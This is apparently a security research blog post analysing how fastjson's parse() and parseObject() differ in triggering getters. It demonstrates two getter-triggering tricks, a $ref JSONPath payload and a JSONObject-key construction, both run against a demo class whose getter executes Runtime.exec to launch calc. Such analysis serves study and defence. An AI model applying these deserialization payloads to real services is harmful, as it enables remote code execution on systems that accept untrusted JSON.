@@ -1,0 +1,264 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="e441da30ef79f82095685ab13da82f76">fastjson之parse和parseobject利用差异</h1>
+<h2 data-content="1" id="e10e97bbe807cd8036cb11bdc32caf80">parse和parseobject区别</h2>
+<h3 data-content="1" id="6be52da190d1034947d1ccff4e5ef084">结论</h3>
+<p>FastJson中的 parse() 和 parseObject()方法都可以用来将JSON字符串反序列化成Java对象，parseObject() 本质上也是调用 parse() 进行反序列化的。但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()。所以进行反序列化时的细节区别在于，parse() 会识别并调用目标类的 setter 方法及某些特定条件的 getter 方法，而 parseObject() 由于多执行了 JSON.toJSON(obj)，所以在处理过程中会调用反序列化目标类的所有 setter 和 getter 方法。--- 引用<a href="https://jlkl.github.io/2021/12/18/Java_07/" target="_blank">https://jlkl.github.io/2021/12/18/Java_07/</a></p>
+<p>上面说的条件：返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong的getter方法</p>
+<h3 data-content="1" id="987aec8a1df659fbd9ed2516442b2b6f">分析</h3>
+<p>测试代码</p>
+<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">demo2</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">FastJsonTest</span> <span class="o">{</span>
+
+    <span class="kd">public</span> <span class="n">String</span> <span class="n">name</span><span class="o">;</span>
+    <span class="kd">public</span> <span class="n">String</span> <span class="n">age</span><span class="o">;</span>
+    <span class="kd">public</span> <span class="nf">FastJsonTest</span><span class="o">()</span> <span class="o">{</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setName</span><span class="o">(</span><span class="n">String</span> <span class="n">test</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"name setter called"</span><span class="o">);</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">test</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">getName</span><span class="o">()</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"name getter called"</span><span class="o">);</span>
+        <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">name</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">getAge</span><span class="o">(){</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"age getter called"</span><span class="o">);</span>
+        <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">age</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+<span class="c1">//        Object obj = JSON.parse("{\"@type\":\"demo2.FastJsonTest\",\"name\":\"thisisname\", \"age\":\"thisisage\"}");</span>
+<span class="c1">//        System.out.println(obj);</span>
+
+        <span class="n">Object</span> <span class="n">obj2</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="s">"{\"@type\":\"demo2.FastJsonTest\",\"name\":\"thisisname\", \"age\":\"thisisage\"}"</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">obj2</span><span class="o">);</span>
+    <span class="o">}</span>
+
+<span class="o">}</span>
+</pre></div>
+<p>执行parse() 时，只有 setName() 会被调用。执行parseObject() 时，setName()、getAge()、getName() 均会被调用。</p>
+<h4 data-content="1" id="0299fdbddd7ec53ff77aa08406ec6c97">parse() 分析</h4>
+<p>为什么能够调用setter和getter方法核心在createJavaBeanDeserializer方法，因为我们反序列化bean的时候是使用JavaBeanDeserializer去反序列化，而创建它的过程中我们看到javaBeaninfo的build方法<br/>
+在这里先获取我们的get方法，但是只有我们的返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong的getter方法</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241206124949-86214b8a-b38d-1.png"/></p>
+<p>所以这也是只能调用这些getter方法的原因<br/>
+我们看看setter方法，是没有什么限制的，只要是个setter方法就ok</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241206125023-9a3ea57c-b38d-1.png"/></p>
+<p>然后看到这里我们就可以想一个问题了<br/>
+<strong>为什么会触发getOutputProperties()</strong></p>
+<p>感觉上 parse() 进行反序列化创建Java类应该只会调用 setter 方法进行成员变量赋值才对，会什么会触发TemplatesImpl类中的 getOutputProperties() 方法呢？</p>
+<p>另外 _outputProperties 成员变量和 getOutputProperties() 明明差了一个_字符，是怎么被 FastJson 关联上的?<br/>
+可以看到处理逻辑是如果是有_就从第4位开始截取的</p>
+<h4 data-content="1" id="206b08b2f1080245cb6a66f599fc975a">parseObject()分析</h4>
+<p>为什么它能够调用到全部的setter方法呢？在build步骤是一样的，没有什么区别，关键在这个方法，我们跟进看看</p>
+<p>先看看调用栈</p>
+<div class="highlight"><pre><span></span><span class="nl">getName:</span><span class="mi">20</span><span class="o">,</span> <span class="n">FastJsonTest</span> <span class="o">(</span><span class="n">demo2</span><span class="o">)</span>
+<span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
+<span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
+<span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
+<span class="nl">invoke:</span><span class="mi">497</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
+<span class="nl">get:</span><span class="mi">451</span><span class="o">,</span> <span class="n">FieldInfo</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
+<span class="nl">getPropertyValue:</span><span class="mi">114</span><span class="o">,</span> <span class="n">FieldSerializer</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">.</span><span class="na">serializer</span><span class="o">)</span>
+<span class="nl">getFieldValuesMap:</span><span class="mi">439</span><span class="o">,</span> <span class="n">JavaBeanSerializer</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">.</span><span class="na">serializer</span><span class="o">)</span>
+<span class="nl">toJSON:</span><span class="mi">902</span><span class="o">,</span> <span class="n">JSON</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">)</span>
+<span class="nl">toJSON:</span><span class="mi">824</span><span class="o">,</span> <span class="n">JSON</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">)</span>
+<span class="nl">parseObject:</span><span class="mi">206</span><span class="o">,</span> <span class="n">JSON</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">)</span>
+<span class="nl">main:</span><span class="mi">33</span><span class="o">,</span> <span class="n">FastJsonTest</span> <span class="o">(</span><span class="n">demo2</span><span class="o">)**</span><span class="n">加粗样式</span><span class="o">**</span>
+</pre></div>
+<p>原因还是那句话<br/>
+<strong>FastJson中的 parse() 和 parseObject()方法都可以用来将JSON字符串反序列化成Java对象，parseObject() 本质上也是调用 parse() 进行反序列化的。但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()</strong><br/>
+所以会调用到目标类的getter方法</p>
+<h2 data-content="1" id="5303175f7f50ca54a42de8793e2c7d52">Fastjson parse突破特殊getter调用限制</h2>
+<p>了解了上面的知识，所以就会引来一个问题，如果我们底层调用的是parse来解析我们的json格式的，那我们是不是就不能利用一些调用链了</p>
+<h3 data-content="1" id="d1041136d5434a6d3875bd99a6ee3074">$ref引用</h3>
+<p>条件限制<br/>
+jdk版本限制<br/>
+fastjson&gt;=1.2.36<br/>
+开启Autotype</p>
+<h4 data-content="1" id="c03a9b502f6bb439372bcf8bc988de01">测试代码</h4>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Main</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">ParserConfig</span><span class="o">.</span><span class="na">getGlobalInstance</span><span class="o">().</span><span class="na">setAutoTypeSupport</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+
+        <span class="n">String</span> <span class="n">payload</span> <span class="o">=</span>
+                <span class="s">"[{\"@type\":\"demo2.User\",\"cmd\":\"calc\"},{\"@type\":\"demo2.User\",\"cmd\":\"notepad.exe\",\"test\":\"test\"},{\"$ref\":\"$[0].cmd\"}]"</span><span class="o">;</span>
+        <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">payload</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">demo2</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">User</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="n">String</span> <span class="n">cmd</span><span class="o">;</span>
+    <span class="kd">private</span> <span class="n">String</span> <span class="n">test</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">getTest</span><span class="o">()</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"getTest"</span><span class="o">);</span>
+        <span class="k">return</span> <span class="n">test</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setTest</span><span class="o">(</span><span class="n">String</span> <span class="n">test</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"setTest"</span><span class="o">);</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">test</span> <span class="o">=</span> <span class="n">test</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">getCmd</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+        <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"getcmd"</span><span class="o">);</span>
+        <span class="k">return</span> <span class="n">cmd</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setCmd</span><span class="o">(</span><span class="n">String</span> <span class="n">cmd</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"setcmd"</span><span class="o">);</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">cmd</span> <span class="o">=</span> <span class="n">cmd</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p>运行main类弹出计算机</p>
+<h4 data-content="1" id="88e36503213e8b54779b101b680a2af1">分析调试</h4>
+<p>首先我们学习一下这个引用<br/>
+基本语法：<br/>
+JSON 引用（$ref）：允许在 JSON 数据中引用已经解析的对象，避免重复数据</p>
+<div class="highlight"><pre><span></span><span class="s">"$ref"</span><span class="o">:</span> <span class="s">"$"</span><span class="err">：</span><span class="n">引用根对象</span><span class="err">。</span>
+<span class="s">"$ref"</span><span class="o">:</span> <span class="s">"$[0]"</span><span class="err">：</span><span class="n">引用根数组的第一个元素</span><span class="err">。</span>
+<span class="s">"$ref"</span><span class="o">:</span> <span class="s">"$.propertyName"</span><span class="err">：</span><span class="n">引用根对象的某个属性</span><span class="err">。</span>
+</pre></div>
+<p>明明是谈不了计算机的，结果弹出来了，我们下断点看看过程</p>
+<div class="highlight"><pre><span></span><span class="nl">getCmd:</span><span class="mi">20</span><span class="o">,</span> <span class="n">User</span> <span class="o">(</span><span class="n">demo2</span><span class="o">)</span>
+<span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
+<span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
+<span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
+<span class="nl">invoke:</span><span class="mi">497</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
+<span class="nl">get:</span><span class="mi">571</span><span class="o">,</span> <span class="n">FieldInfo</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
+<span class="nl">getPropertyValue:</span><span class="mi">151</span><span class="o">,</span> <span class="n">FieldSerializer</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">.</span><span class="na">serializer</span><span class="o">)</span>
+<span class="nl">getFieldValue:</span><span class="mi">616</span><span class="o">,</span> <span class="n">JavaBeanSerializer</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">.</span><span class="na">serializer</span><span class="o">)</span>
+<span class="nl">getPropertyValue:</span><span class="mi">3873</span><span class="o">,</span> <span class="n">JSONPath</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">)</span>
+<span class="nl">eval:</span><span class="mi">2354</span><span class="o">,</span> <span class="n">JSONPath$PropertySegment</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">)</span>
+<span class="nl">eval:</span><span class="mi">121</span><span class="o">,</span> <span class="n">JSONPath</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">)</span>
+<span class="nl">handleResovleTask:</span><span class="mi">1599</span><span class="o">,</span> <span class="n">DefaultJSONParser</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">.</span><span class="na">parser</span><span class="o">)</span>
+<span class="nl">parse:</span><span class="mi">183</span><span class="o">,</span> <span class="n">JSON</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">)</span>
+<span class="nl">parse:</span><span class="mi">191</span><span class="o">,</span> <span class="n">JSON</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">)</span>
+<span class="nl">parse:</span><span class="mi">147</span><span class="o">,</span> <span class="n">JSON</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">)</span>
+<span class="nl">main:</span><span class="mi">10</span><span class="o">,</span> <span class="n">Main</span>
+</pre></div>
+<p>我们看到在Object value = parser.parse();就已经解析了我们的value，也调用了相应的setter方法赋值了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241206125104-b2b4b042-b38d-1.png"/></p>
+<p>之后调用handleResolveTask就和这个名字一样的意思<br/>
+处理 JSON 解析过程中出现的引用解析任务（Resolve Task）。这些任务通常涉及到 JSONPath 引用（例如 <code>$ref</code>）的解析和处理<br/>
+判断$开头的，然后去实例化我们的JSONPath的eval方法去解析我们的value</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241206125118-bb189898-b38d-1.png"/></p>
+<p>看到eval方法<br/>
+设置主类，然后调用eval继续去处理</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241206125139-c789a856-b38d-1.png"/></p>
+<p>我们的sagment如下</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241206125149-cd99fb42-b38d-1.png"/><br/>
+继续调用eval</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241206125200-d405b0a2-b38d-1.png"/></p>
+<p>根据传入的String调用get方法</p>
+<h4 data-content="1" id="a333e7c9c40088fd37f23c59dd398729">低版本不能使用原因</h4>
+<p>需要refValue不为null，并且refValue必须是JSONObject类。如下图</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241206125304-fa75231c-b38d-1.png"/></p>
+<h3 data-content="1" id="9e72ca566649fb92041788199d1ed1e1">通过JSONObject调用</h3>
+<h4 data-content="1" id="dd2ef467b97b2c6ee105605544ee5886">小插曲</h4>
+<p>下面给出代码</p>
+<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">demo2</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
+
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="n">String</span> <span class="n">id</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">getId</span><span class="o">()</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"getID"</span><span class="o">);</span>
+        <span class="k">return</span> <span class="n">id</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setId</span><span class="o">(</span><span class="n">String</span> <span class="n">id</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"setID"</span><span class="o">);</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">id</span> <span class="o">=</span> <span class="n">id</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+
+        <span class="n">String</span> <span class="n">payload</span> <span class="o">=</span> <span class="s">"[{\"@type\":\"demo2.Test\",\"id\":\"123\"}]"</span><span class="o">;</span>
+        <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">payload</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">o</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p>发现竟然调用了我们的get方法<br/>
+这是为什么？<br/>
+其实是因为我已经把他变成数组了，仔细看外面多了一层[]把我们的数据变成了数组</p>
+<p>结果是<br/>
+由于打印的是一个数组对象，数组的 toString() 方法会递归地调用每个元素的 toString() 方法。由于 Test 类没有重写 toString() 方法，这会调用 JSON.toJSONString(o) 来转换对象为 JSON 字符串，这个过程会调用 getId 方法来获取 id 属性值，故打印 getID。</p>
+<div class="highlight"><pre><span></span><span class="nl">getId:</span><span class="mi">11</span><span class="o">,</span> <span class="n">Test</span> <span class="o">(</span><span class="n">demo2</span><span class="o">)</span>
+<span class="nl">write:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">ASMSerializer_1_Test</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">.</span><span class="na">serializer</span><span class="o">)</span>
+<span class="nl">write:</span><span class="mi">135</span><span class="o">,</span> <span class="n">ListSerializer</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">.</span><span class="na">serializer</span><span class="o">)</span>
+<span class="nl">write:</span><span class="mi">312</span><span class="o">,</span> <span class="n">JSONSerializer</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">.</span><span class="na">serializer</span><span class="o">)</span>
+<span class="nl">toJSONString:</span><span class="mi">1077</span><span class="o">,</span> <span class="n">JSON</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">)</span>
+<span class="nl">toString:</span><span class="mi">1071</span><span class="o">,</span> <span class="n">JSON</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">)</span>
+<span class="nl">valueOf:</span><span class="mi">2994</span><span class="o">,</span> <span class="n">String</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">)</span>
+<span class="nl">println:</span><span class="mi">821</span><span class="o">,</span> <span class="n">PrintStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
+<span class="nl">main:</span><span class="mi">24</span><span class="o">,</span> <span class="n">Test</span> <span class="o">(</span><span class="n">demo2</span><span class="o">)</span>
+</pre></div>
+<p>发现确实是在print那里调用的，是把我们的字符串打印的时候是把我们的array对象打印出来</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241206125317-02380b00-b38e-1.png"/></p>
+<p>所以其实这也给了我们一个提示，我们是不是找一个tostring，把我们的字符串还原为我们的对象的过程</p>
+<p>Fastjson使用ASM来代替反射，通过ASM的ClassWriter来生成JavaBeanSerializer的子类，重写write方法，JavaBeanSerializer中的write方法会使用反射从JavaBean中获取相关信息，ASM针对不同类会生成独有的序列化工具类，这里如ASMSerializer_1_Test ，也会调用getter获取类种相关信息</p>
+<h4 data-content="1" id="4e9f8101a6829184aa7c10997e1ca258">正经过程</h4>
+<h5 data-content="1" id="dff9b6077c1a540a635d36f9b355ede1">测试代码</h5>
+<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">demo2</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="o">;</span>
+
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="n">String</span> <span class="n">id</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">getId</span><span class="o">()</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"getID"</span><span class="o">);</span>
+        <span class="k">return</span> <span class="n">id</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setId</span><span class="o">(</span><span class="n">String</span> <span class="n">id</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"setID"</span><span class="o">);</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">id</span> <span class="o">=</span> <span class="n">id</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">ParserConfig</span><span class="o">.</span><span class="na">getGlobalInstance</span><span class="o">().</span><span class="na">setAutoTypeSupport</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">String</span> <span class="n">payload</span> <span class="o">=</span> <span class="s">"{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"aaa\":{\"@type\":\"demo2.Test\",\"id\":\"123\"}}"</span><span class="o">;</span>
+        <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">payload</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">o</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<h5 data-content="1" id="3b227edae64231ea1689820dc01cd13d">分析调试</h5>
+<p>巧妙利用了JSONObject.toString ，JSONObject 继承了JSON抽象类</p>
+<p>com.alibaba.fastjson.JSON#toString，进行序列化操作，object 转 str</p>
+<p>那么我们只要在反序列化过程中，找到一处可以使用JSONObject调用toString的地方就可以了</p>
+<p>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject<br/>
+会调用我们的key的Tostring</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241206125343-11dd40de-b38e-1.png"/></p>
+<p>Fastjson在解析的时候如果遇到{，会加一层JSONObject，那么只需将key构造成JSONObject，类似{{some}:x} 即可</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241206125356-199bf5ae-b38e-1.png"/></p>
+<h5 data-content="1" id="979700d0df61a9e64d966b2bd90dc955">为什么大于1.2.36版本不行</h5>
+<p>com.alibaba.fastjson.parser.DefaultJSONParser#parse中直接入口点掐了，不再调用toString函数</p>
+</div>
+</div>
